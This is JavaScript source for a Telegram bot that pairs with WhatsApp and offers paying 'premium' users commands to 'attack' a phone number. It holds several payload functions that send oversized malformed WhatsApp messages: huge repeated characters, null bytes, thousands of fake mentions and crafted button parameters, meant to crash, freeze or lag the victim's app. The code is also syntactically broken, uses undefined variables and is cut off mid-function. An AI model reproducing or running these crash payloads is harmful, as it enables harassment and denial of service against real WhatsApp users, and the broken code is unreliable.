const { Telegraf, Markup, session } = require("telegraf"); 
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  getMandarinObfuscationConfig,
  generateWAMessage,
} = require("@whiskeysockets/baileys");
const { Octokit } = require("@octokit/rest");
const os = require("os");
const moment = require("moment-timezone");
const pino = require("pino");
const figlet = require("figlet");
const gradient = require("gradient-string");
const { BOT_TOKEN } = require("./config");
const fetch = require('node-fetch');
const FormData = require('form-data');
const { fromBuffer } = require('file-type');
const ownerFile = "./database/Owner.json";

let bots = [];
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";

const developerId = "7653566720"; 

const bot = new Telegraf(BOT_TOKEN);
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const usePairingCode = true;

bot.use(session());

const randomImages = [
  "",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];
  
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

function parseDuration(durationStr) {
  const match = durationStr.match(/^(\d+)([dhm])$/);
  if (!match) return 0;
  const value = parseInt(match[1]);
  const unit = match[2];
  switch (unit) {
    case 'd': return value * 24 * 60 * 60 * 1000;
    case 'h': return value * 60 * 60 * 1000;
    case 'm': return value * 60 * 1000;
    default: return 0;
  }
}


function isActiveUser(list, id) {
  if (!list[id]) return false;
  return new Date(list[id]) > new Date();
}

async function openaiChat(text) {
    try {
        const response = await axios.get(
            `https://exonity.tech/api/gptlogic2?message=${encodeURIComponent(text)}&prompt=hai&mode=realtime`
        );
        const data = response.data;

        if (data.status === 200) {
            return data.result || "Tidak ada respons dari API.";
        } else {
            return "API mengembalikan status gagal.";
        }
    } catch (error) {
        console.error("Error:", error.message);
        return "Maaf, terjadi kesalahan saat memproses permintaan.";
    }
}

//====================================================================
const startSesi = async () => {
  try {
    const { state, saveCreds } = await useMultiFileAuthState("./session");
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
      version,
      keepAliveIntervalMs: 30000,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      auth: state,
      browser: ["Mac OS", "Safari", "10.15.7"],
      getMessage: async (key) => ({
        conversation: "P",  Placeholder
      }),
    };
    sock = makeWASocket(connectionOptions);
    sock.ev.on("creds.update", async (creds) => {
      try {
        await saveCreds(creds);
      } catch (err) {
        console.log(chalk.red("Gagal menyimpan creds:"), err);
      }
    });
sock.ev.on("connection.update", (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "open") {
        isWhatsAppConnected = true;
        console.log(chalk.white.bold("WhatsApp Terhubung"));
      }

      if (connection === "close") {
        isWhatsAppConnected = false;
        const shouldReconnect =
          lastDisconnect?.error?.output?.statusCode !==
          DisconnectReason.loggedOut;

        console.log(chalk.red.bold("WhatsApp Terputus"));

        if (shouldReconnect) {
          console.log(chalk.yellow.bold("Menghubungkan ulang dalam 5 detik..."));
          setTimeout(() => startSesi(), 5000);
        } else { console.log(chalk.red.bold("Session WA sudah logout. Harus login ulang."));
        }
      }
    });
  } catch (err) {
    console.log(chalk.red("Gagal start sesi:"), err);
    setTimeout(() => startSesi(), 5000); // retry otomatis kalau error
  }
};
//delay agar tidak logout
const sendSafeMessage = async (jid, text, delay = 1000) => {
  if (!isWhatsAppConnected) return console.log("WA belum terhubung!");
  try {
    await sock.sendMessage(jid, { text });
    await new Promise((res) => setTimeout(res, delay)); // delay antar pesan
  } catch (err) {
    console.log(chalk.red("Gagal kirim pesan:"), err);
  }
};
module.exports = { startSesi, sendSafeMessage };

//==================================================================
const loadJSON = (file) => {
  if (!fs.existsSync(file)) return [];
  return JSON.parse(fs.readFileSync(file, "utf8"));
};

const saveJSON = (file, data) => {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

let ownerUsers = loadJSON(ownerFile);
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

const checkOwner = (ctx, next) => {
  if (!isActiveUser(ownerUsers, ctx.from.id.toString())) {
    return ctx.reply("❌ Anda bukan Owner");
  }
  next();
};

const checkAdmin = (ctx, next) => {
  if (!isActiveUser(adminUsers, ctx.from.id.toString())) {
    return ctx.reply("❌ Anda bukan Admin.");
  }
  next();
};

const checkPremium = (ctx, next) => {
  if (!isActiveUser(premiumUsers, ctx.from.id.toString())) {
    return ctx.reply("Can Only Be Used Premium User");
  }
  next();
};

const addOwner = (userId, duration) => {
  const expired = new Date(Date.now() + parseDuration(duration)).toISOString();
  ownerUsers[userId] = expired;
  fs.writeFileSync(ownerFile, JSON.stringify(ownerUsers, null, 2));
};

const removeOwner = (userId) => {
  delete ownerUsers[userId];
  fs.writeFileSync(ownerFile, JSON.stringify(ownerUsers, null, 2));
};

const addAdmin = (userId, duration) => {
  const expired = new Date(Date.now() + parseDuration(duration)).toISOString();
  adminUsers[userId] = expired;
  fs.writeFileSync(adminFile, JSON.stringify(adminUsers, null, 2));
};

const removeAdmin = (userId) => {
  delete adminUsers[userId];
  fs.writeFileSync(adminFile, JSON.stringify(adminUsers, null, 2));
};

const addPremium = (userId, duration) => {
  const expired = new Date(Date.now() + parseDuration(duration)).toISOString();
  premiumUsers[userId] = expired;
  fs.writeFileSync(premiumFile, JSON.stringify(premiumUsers, null, 2));
};

const removePremium = (userId) => {
  delete premiumUsers[userId];
  fs.writeFileSync(premiumFile, JSON.stringify(premiumUsers, null, 2));
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("› WhatsApp Not Connected!");
    return;
  }
  next();
};

const prosesrespone1 = async (target, ctx) => {
  const caption = `
┏━━━━━━━━━━━━━━━━━━━━━━━❍
┃ ⌜ 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 ⌟
┃› › Attacking : tg://user?id=${target.split("@") [0]}
┗━━━━━━━━━━━━━━━━━━━━━━━❍
 `;

  try {
      await ctx.replyWithPhoto("https://files.catbox.moe/jiqsek.jpg", {
          caption: caption,
          parse_mode: "Markdown", 
          reply_markup: {
            inline_keyboard: [
                [{ text: "Check Target", callback_data: `tg://user?id=${target.split("@") [0]}` }]
            ]
        }
      });
      console.log(chalk.blue.bold(`[✓] Process attack target: ${target}`));
  } catch (error) {
      console.error(chalk.red.bold('[!] Error sending process response:', error));
      // Fallback to text-only message if image fails
      await ctx.reply(caption, { parse_mode: "Markdown" });
  }
};

const donerespone1 = async (target, ctx) => {
  // Get random hexcolor for timestamp
  const hexColor = '#' + Math.floor(Math.random()*16777215).toString(16);
  const timestamp = moment().format('HH:mm:ss');
  
  try {
    const caption = `
┏━━━━━━━━━━━━━━━━━━━━━━━❍
┃ ⌜ 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 ⌟
┃› › Attacking : tg://user?id=${target.split("@") [0]}
┗━━━━━━━━━━━━━━━━━━━━━━━❍
 `;
 
    await ctx.replyWithPhoto("https://files.catbox.moe/jiqsek.jpg", {
        caption: caption,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [{ text: "Check Target!", callback_data: `tg://user?id=${target.split("@") [0]}` }]
            ]
        }
    });
    console.log(chalk.green.bold(`[✓] Attack in succes target: ${target}`));
  } catch (error) {
      console.error(chalk.red.bold('[!] Error:', error));
      // Fallback message tanpa quotes jika API error
      const fallbackCaption = `
┏━━━━━━━━━━━━━━━━━━━━━━━❍
┃ ⌜ 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 ⌟
┃› › Attacking : ${target.split("@") [0]}
┗━━━━━━━━━━━━━━━━━━━━━━━❍
`;
 
      await ctx.reply(fallbackCaption, {
          parse_mode: "Markdown",
          reply_markup: {
              inline_keyboard: [
                  [{ text: "Check Target!", url: `tg;//user?id=${target.split("@") [0]}` }]
              ]
          }
      });
  }
 };
 
 function getSystemInfo() {
  const totalMem = os.totalmem() / (1024 * 1024);
  const freeMem = os.freemem() / (1024 * 1024);
  const usedMem = totalMem - freeMem;
  const cpuUsage = os.loadavg()[0].toFixed(2); // 1 menit rata-rata load

  return {
    ram: `${usedMem.toFixed(2)}MB / ${totalMem.toFixed(2)}MB`,
    cpu: `${cpuUsage}`,
    uptime: getUptime()
  };
}

//=====================================================================
bot.start(async (ctx) => {
  const sys = getSystemInfo();
  const userId = ctx.from.id.toString();
  
  const mainMenuMessage = `
\`\`\`Welcome Back Script Rapzers!\`\`\`

(☇) › Hello I Am A Bot Designed To
Help Not Destroy The World

☇ Author : Rapzz Is Here
☇ Version : 1.0
☇ Cpu : ${sys.cpu}
☇ Ram : ${sys.ram}

\`\`\`Please sellect button below!\`\`\`
`,

  const keyboard = [
    [
      {
          text: "Owner Menu",
          callback_data: "owner_menu",
      },
      {
          text: "Bug Area",
          callback_data: "bug_menu",
        }
      ],
      [
        {
          text: "Developer",
          callback_url: "t.me/RapzXyzz",
        },
        {
          text: "Channel",
          callback_url: "https://t.me/rapzzcomunityy",
        }
      ],
    ];
    
    await ctx.replyWithPhoto(getRandomImage(), {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: keyboard }
    });
});

bot.action("bug_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (userId !== premiumUsers) {
    await ctx.answerCbQuery("Can Only Be Used Premium Users!", { show_alert: true });
    return;
  }
  
  const mainMenuMessage = `
\`\`\`Beralih Ke Bug Area\`\`\`

☇ /Rapzdelay <Number>
☇ /Rapzui <Number>
☇ /Rapzcrash <Number>
☇ /Rapzfreeze <Number>

Pilih Salah Satu Command
Yang Ingin Anda Jalankan!
`,

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };
  
const keyboard = {
  keyboard: [
      [
        {
           text: "☇ Back To Menu",
           callback_data: "back",
        }
      ],
    ],
  };
  
  try {
    await ctx.editMessageMedia(media, { inline_keyboard: keyboard});
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("owner_menu", async (ctx) => {
  
  const mainMenuMessage = `
\`\`\`Beralih Ke Mode Owner Menu\`\`\`

☇ /addprem <id> <durasi>
☇ /addadmin <id> <durasi>
☇ /delprem <id>
☇ /deladmin <id>
☇ /addowner <id> <durasi>
☇ /delowner <id>
☇ /connect <Number>

Developed By @RapzXyzz ✓
`,

    const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };
  
  const keyboard = {
    inline_keyboard: [
      [
        {
           text: "☇ Back To Menu",
           callback_data: "back",
        }
      ],
    ],
  };
  
  try {
    await ctx.editMessageMedia(media, { inline_keyboard: keyboard});
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("back", async (ctx) => {
  const sys = getSystemInfo();
  const userId = ctx.from.id.toString();
  
  const mainMenuMessage = `
\`\`\`Welcome Back Script Rapzers!\`\`\`

(☇) › Hello I Am A Bot Designed To
Help Not Destroy The World

☇ Author : Rapzz Is Here
☇ Version : 1.0
☇ Cpu : ${sys.cpu}
☇ Ram : ${sys.ram}

\`\`\`Please sellect button below!\`\`\`
`;
 
 const keyboard = {
   inline_keyboard: [
       [
         {
            text: "Owner Menu",
            callback_data: "owner_menu",
         },
         {
            text: "Bug Area",
            callback_data: "bug_menu",
         }
      ],
      [
         {
           text: "Developer",
           callback_url: "t.me/RapzXyzz",
         },
         {
           text: "Channel",
           callback_url: "https://t.me/rapzzcomunityy",
         }
       ],
     ],
   };
   
   const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };
  
  try {
    await ctx.editMessageMedia(media, { inline_keyboard: keyboard});
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
    caption: media.caption,
    parse_mode: media.parse_mode,
    reply_markup: keyboard,
    });
  }
});

//=================================================\\
bot.command("Rapzdelay",checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split ("")[1];
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id;
  
  if(!q) return ctx.reply("× Contoh\nExample: /Rapzdelay 628×××××");
  
  if(!isActiveUser(ownerUsers, userId)) {
    if(!isOnGlobalCooldown()) {
      const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
      return ctx.reply(`⏳ Jeda, tunggu ${remainingTime} detik lagi`);
    }
  }
  
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
  const sendMessage = await ctx.sendPhoto(proccesImg, {
    caption: `
  ☇ Status : Procces...
  ☇ Type : Delay Hard Invisible
  ☇ Target : https://wa.me/${q}
  ☇ Note : Tolong Di Jeda 5-10 Menit!
    `,
    
    parse_mode: "Markdown",
  });
  
  console.log("\x1b[32m[BOT]\x1b[0m Procces Mengirim Bug!");
  if (!isActiveUser(ownerUsers, userId)) setGlobalCooldown();
     for (let i = 0; i < 2; i++) {
        await DelayMakerInvisss(target);
        await sleep(2000)
     }
     console.log("\x1b[32m[BOT]\x1b[0m Attacking Succesfully!!");
     
     await ctx.editMessageCaption(`
  ☇ Status : Succesfully ✓
  ☇ Type : Delay Hard Invisible
  ☇ Target : https://wa.me/${q}
  ☇ Note : Tolong Di Jeda 5-10 Menit! `
  
  {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
        inline_keyboard: [
        [{ text: "Check Target ✓", url: `https://wa.me/${q}` },
      ],
    },
   }
  );
});

bot.command("Rapzui",checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split ("")[1];
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id;
  
  if(!q) return ctx.reply("× Contoh\nExample: /Rapzui 628×××××");
  
  if(!isActiveUser(ownerUsers, userId)) {
    if(!isOnGlobalCooldown()) {
      const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
      return ctx.reply(`⏳ Jeda, tunggu ${remainingTime} detik lagi`);
    }
  }
  
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
  const sendMessage = await ctx.sendPhoto(proccesImg, {
    caption: `
  ☇ Status : Procces...
  ☇ Type : Crash Ui
  ☇ Target : https://wa.me/${q}
  ☇ Note : Tolong Di Jeda 5-10 Menit!
    `,
    
    parse_mode: "Markdown",
  });
  
  console.log("\x1b[32m[BOT]\x1b[0m Procces Mengirim Bug!");
  if (!isActiveUser(ownerUsers, userId)) setGlobalCooldown();
     for (let i = 0; i < 5; i++) {
        await DelayCombo(target)
        await sleep(2000)
     }
     console.log("\x1b[32m[BOT]\x1b[0m Attacking Succesfully!!");
     
     await ctx.editMessageCaption(`
  ☇ Status : Succesfully ✓
  ☇ Type : Crash Ui
  ☇ Target : https://wa.me/${q}
  ☇ Note : Tolong Di Jeda 5-10 Menit! `
  
  {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
        inline_keyboard: [
        [{ text: "Check Target ✓", url: `https://wa.me/${q}` },
      ],
    },
   }
  );
});

bot.command("Rapzfreeze",checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split ("")[1];
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id;
  
  if(!q) return ctx.reply("× Contoh\nExample: /Rapzfreeze 628×××××");
  
  if(!isActiveUser(ownerUsers, userId)) {
    if(!isOnGlobalCooldown()) {
      const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
      return ctx.reply(`⏳ Jeda, tunggu ${remainingTime} detik lagi`);
    }
  }
  
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
  const sendMessage = await ctx.sendPhoto(proccesImg, {
    caption: `
  ☇ Status : Procces...
  ☇ Type : Freeze Home
  ☇ Target : https://wa.me/${q}
  ☇ Note : Tolong Di Jeda 5-10 Menit!
    `,
    
    parse_mode: "Markdown",
  });
  
  console.log("\x1b[32m[BOT]\x1b[0m Procces Mengirim Bug!");
  if (!isActiveUser(ownerUsers, userId)) setGlobalCooldown();
     for (let i = 0; i < 5; i++) {
        await FreezeHomeNew(target);
        await sleep(1000)
     }
     console.log("\x1b[32m[BOT]\x1b[0m Attacking Succesfully!!");
     
     await ctx.editMessageCaption(`
  ☇ Status : Succesfully ✓
  ☇ Type : Freeze Home
  ☇ Target : https://wa.me/${q}
  ☇ Note : Tolong Di Jeda 5-10 Menit! `
  
  {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
        inline_keyboard: [
        [{ text: "Check Target ✓", url: `https://wa.me/${q}` },
      ],
    },
   }
  );
});

bot.command("Rapzcrash",checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split ("")[1];
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id;
  
  if(!q) return ctx.reply("× Contoh\nExample: /Rapzcrash 628×××××");
  
  if(!isActiveUser(ownerUsers, userId)) {
    if(!isOnGlobalCooldown()) {
      const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
      return ctx.reply(`⏳ Jeda, tunggu ${remainingTime} detik lagi`);
    }
  }
  
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
  const sendMessage = await ctx.sendPhoto(proccesImg, {
    caption: `
  ☇ Status : Procces...
  ☇ Type : Crash Invisible
  ☇ Target : https://wa.me/${q}
  ☇ Note : Tolong Di Jeda 5-10 Menit!
    `,
    
    parse_mode: "Markdown",
  });
  
  console.log("\x1b[32m[BOT]\x1b[0m Procces Mengirim Bug!");
  if (!isActiveUser(ownerUsers, userId)) setGlobalCooldown();
     for (let i = 0; i < 2; i++) {
        await CrashInvisible(target);
     }
     console.log("\x1b[32m[BOT]\x1b[0m Attacking Succesfully!!");
     
     await ctx.editMessageCaption(`
  ☇ Status : Succesfully ✓
  ☇ Type : Crash Invisible
  ☇ Target : https://wa.me/${q}
  ☇ Note : Tolong Di Jeda 5-10 Menit! `
  
  {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
        inline_keyboard: [
        [{ text: "Check Target ✓", url: `https://wa.me/${q}` },
      ],
    },
   }
  );
});

bot.command("addadmin", async (ctx) => {
  const senderId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Format: /addadmin <id> <durasi>");

  const targetId = args[1];
  const duration = args[2];

  if (!isActiveUser(ownerUsers, senderId))
    return ctx.reply("❌ Hanya owner yang bisa menambah admin.");

  addAdmin(targetId, duration);
  ctx.reply(`✅ ID ${targetId} sekarang admin selama ${duration}`);
});

bot.command("addprem", async (ctx) => {
  const senderId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Format: /addprem <id> <durasi>");

  const targetId = args[1];
  const duration = args[2];

  if (!isActiveUser(ownerUsers, senderId) && !isActiveUser(adminUsers, senderId))
    return ctx.reply("❌ Hanya admin/owner yang bisa menambah premium.");

  addPremium(targetId, duration);
  ctx.reply(`✅ ID ${targetId} sekarang premium selama ${duration}`);
});

bot.command("delprem", async (ctx) => {
  const senderId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Format: /delprem <id>");

  const targetId = args[1];

  if (!isActiveUser(ownerUsers, senderId) && !isActiveUser(adminUsers, senderId))
    return ctx.reply("❌ Hanya admin/owner yang bisa menghapus premium.");

  removePremium(targetId);
  ctx.reply(`✅ ID ${targetId} sudah dihapus dari premium`);
});
bot.command("addowner", async (ctx) => {
  const senderId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Format: /addowner <id> <durasi>");

  const targetId = args[1];
  const duration = args[2];

  if (ctx.from.id.toString() !== "8488114208") 
    return ctx.reply("Hanya owner utama.");

  addOwner(targetId, duration);
  ctx.reply(`✅ ID ${targetId} sekarang owner selama ${duration}`);
});
bot.command("delowner", async (ctx) => {
  const senderId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Format: /delowner <id>");

  const targetId = args[1];

  if (ctx.from.id.toString() !== "8488114208") 
    return ctx.reply("Hanya owner utama.");

  removeOwner(targetId);
  ctx.reply(`✅ ID ${targetId} sudah dihapus dari owner`);
});

bot.command("connect", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return await ctx.reply(
      "❗ Contoh: /addpairing 628xxx");
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (sock && sock.user) {
    return await ctx.reply("Silahkan hapus session terlebih dahulu");
  }

  try {
    const code = await sock.requestPairingCode(phoneNumber, "YANNXMLL");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `\`\`\`
▢ Kode Pairing...\`\`\`
╰➤ Nomor  : ${phoneNumber} 
╰➤ Kode   : ${formattedCode}
`,

      parse_mode: "Markdown",
      reply_markup: {
         inline_keyboard: [
            [
              { 
                text: "каналы", 
                url: "https://t.me/SanzzChannel"
              },
              {
                text: "каналы", 
                url: "https://t.me/+r55iQVLXEwA1YmQ9"
              }
            ],
         ],
      },
    });
    
  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply(
      "❌ Gagal melakukan pairing. Pastikan nomor Whatsapp valid!"
    );
  }
});

bot.command("clearsesi", checkOwner, checkAdmin, async (ctx) => {
  try {
    await fs.promises.rm('./session', { recursive: true, force: true });

    isWhatsAppConnected = false;
    await ctx.reply("✅ Session berhasil dihapus! Menyambung ulang...");

    await startSesi();
  } catch (err) {
    console.error("❌ Gagal menghapus session:", err);
    await ctx.reply("❌ Gagal menghapus session. Coba cek folder atau permission.");
  }
});
//=================================================\\
async function CallUi(target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: "〽️" + "ꦾ".repeat(900000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(900000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson:
                     "ꦾ".repeat(900000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson:
                     "ꦾ".repeat(900000),
                }
              ]
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function PackStcBlank(target) {
  try {
    let message = {
      extendedTextMessage: {
        text: "XtX ({{" + "ꦾ".repeat(100000),
        contextInfo: {
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 50000) + "@s.whatsapp.net")
          ],                
          externalAdReply: {
            title: "ꦾ".repeat(100000),
            body: "ꦾ".repeat(100000),
            thumbnailUrl: "http://Wa.me/stickerpack/Xtrovie",
            sourceUrl: "http://Wa.me/stickerpack/Xtrovie",
            mediaType: 1,
            renderLargerThumbnail: false,
            showAdAttribution: false
          }
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: "{}"
            }
          ]
        }
      }
    };

    await sock.relayMessage(target, message, {
      participant: { jid: target }
    });
  } catch (err) {
    console.log(err);
  }
  
  async function Delayinvis(target, mention) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "Are You Okey?", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  }, {});
  
  await sock.relayMessage(
      "status@broadcast",
      msg.message || msg,
      {
        messageId: msg.key?.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                  },
                ],
              },
            ],
          },
        ],
      }
    );

  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg1.key,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "Are you okey?" },
            content: undefined
          }
        ]
      }
    );
  }
}

async function FreezeClick(target) {
const mentionedList = [
    target, ...Array.from({ length: 1900 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
      )
    ];
    
try {
    const msg = {
     groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
       inviteCode: "974197419741",
        inviteExpiration: "97419741",
         groupName: "https://wa.me/stickerpack/XtrovieTeam" + "ꦽ".repeat(100000)
           caption: "/u0000" + "ꦾ".repeat(60000),
             jpegThumbnail: null
            }
         },
         nativeFlowMessage: {
              messageParamsJson: "{}",
              buttons: [
                {
                  name: "payment_method",
                  buttonParamsJson: "\u0000".repeat(100000),
                },
              ]
            },
            contextInfo: {
              remoteJid: target,
              participant: target,
              mentionedJid: mentionedList,
              stanzaId: sock.generateMessageTag(),
            },
                     
        await sock.relayMessage(target, msg, {
        participant: { jid: target }, 
        messageId: null
     })
    } catch (error) {
        console.log("error:\n" + error);
    }
  }

async function freezehome(target, ptcp = true) {
let APICrash = JSON.stringify({
        status: true,
        criador: "Rapz ¿?",
        resultado: {
            type: "md",
            ws: {
                _events: { "CB:ib,,dirty": ["Array"] },
                _eventsCount: 9999999,
                _maxListeners: 0,
                url: "wss://web.whatsapp.com/ws/chat",
                config: {
                    version: ["2.25.12.25","beta"],
                    browser: ["Chrome", "Windows"],
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                    depayyCectTimeoutMs: 20000,
                    keepAliveIntervalMs: 30000,
                    logger: {},
                    printQRInTerminal: false,
                    emitOwnEvents: true,
                    defaultQueryTimeoutMs: 60000,
                    customUploadHosts: [],
                    retryRequestDelayMs: 250,
                    maxMsgRetryCount: 5,
                    fireInitQueries: true,
                    auth: { Object: "authData" },
                    markOnlineOndepayyCect: true,
                    syncFullHistory: true,
                    linkPreviewImageThumbnailWidth: 192,
                    transactionOpts: { Object: "transactionOptsData" },
                    generateHighQualityLinkPreview: true,
                    options: {},
                    appStateMacVerification: { Object: "appStateMacData" },
                    mobile: true
                }
            }
        }
    });
let conf = {}
if (ptcp === true) {
    conf = {
        participant: {
            jid: target
        }
    }
}
sock.relayMessage(target, {
viewOnceMessage: {
message: {
interactiveMessage: {
    header: {
        hasMediaAttachment: false
    },
    body: {
        text: "ॏ".repeat(90000)
    },
    nativeFlowMessage: {
        buttons: [
            {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                    "status": "𛀠"
                })
            },
            {
                name: "call_permission_request",
                buttonParamsJson: ""
            },
            {
                name: "single_sellect", 
                buttonParamsJson: APICrash + "\u0003"
            },
            {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                    "status": "𛀠"
                })
            },
            {
                name: "call_permission_request",
                buttonParamsJson: APICrash + "\u0003", 
            }, 
            {
                name: "galaxy_message", 
                buttonParamsJson: APICrash + "\u0003"
            },
            {
                name: "galaxy_custom", 
                buttonParamsJson: APICrash + "\u0003"
            },
            {
                name: "payment_info", 
                buttonParamsJson: APICrash + "\u0003"
            },
            {
                name: "cta_url", 
                buttonParamsJson: APICrash + "\u0003"
            },
            {
                name: "cta_copy", 
                buttonParamsJson: APICrash + "\u0003"
            },
            {
                name: "catalog_message", 
                buttonParamsJson: APICrash + "\u0003"
            },
            {
                name: "send_location", 
                buttonParamsJson: APICrash + "\u0003"
            },
            {
                name: "review_order", 
                buttonParamsJson: APICrash + "\u0003"
            },
        ],
        messageParamsJson: ""
    }
}
}
}
}, conf)
}

async function ImageUi(target) {
  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0&mms3=true",
